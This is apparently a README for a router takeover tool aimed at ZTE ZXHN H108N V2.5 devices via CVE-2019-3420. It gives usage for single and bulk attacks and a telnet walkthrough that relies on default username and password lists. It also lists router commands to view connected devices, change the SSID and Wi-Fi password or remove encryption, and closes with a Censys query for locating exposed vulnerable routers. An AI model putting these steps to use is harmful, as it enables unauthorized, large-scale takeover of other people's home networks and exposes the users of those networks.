# Zata-Router-Takeover | 𓊃𓂝𓏏𓂝 𓏏𓂝𓎡𓂋𓏏𓃭
ZTE ZXHN H108N V2.5 Router Takeover Tool<br>
CVE-2019-3420
### Single Host Attack: <br>
java main (Gateway IP / IP of the Portal) (ssid) (Password) <br>
ssid = Name of the Network (Wireless) <br>
Password = Password of the Network (Wireless) <br>
### Multi Host Attack: <br>
java bulk (ssid) (Password) <br>
in hosts.txt type: <br>
192.168.1.1,192.168.1.11, <br>
to Attack 192.168.1.1 and 192.168.1.11. <br>
### 2-Telnet Attack (If port 23 is open):
 First, Let’s get our Gateway IP Address. Which is often 192.168.1.1.. <br>
 Then let’s scan our IP with nmap, We’ll see that port 23 is open. <br>
 let’s establish a connection. He Asks for the Username and Password.. <br>
 We can use https://github.com/Ligeti15/ZXHN-H108N-Login .Or try these. <br>
 Usernames: admin root zte public toor <br>
 Passwords: admin root zte public toor <br>
 BOOM ! .Now we have access to the Gateway. You will see something like ZTE> <br>
 Commands: <br>
 - ip dhcp br0 status → See Devices Connected to the Router <br>
 - rt node ssid [NAME] → Change the SSID of the Wi-Fi to [NAME] <br>
 - rt node wpapsk [PASSWORD] → Change the Password of the Wi-Fi to [PASSWORD] <br>
 - rt node save → Save Changes <br>
 - rt node authmode open → Remove the Password and Open the Network <br>
 - show all / sys atsh / rtwlan rtdisp → Show Information <br>
 Also You can Discover all Options Available with these Commands: <br>
 - ? → General Commands <br>
 - rt ? → Wireless Commands <br>
 *You can Search Censys for Vulnerable Devices using this Query: (80.http.get.title%3A+ZXHN+H108N+V2.5)*
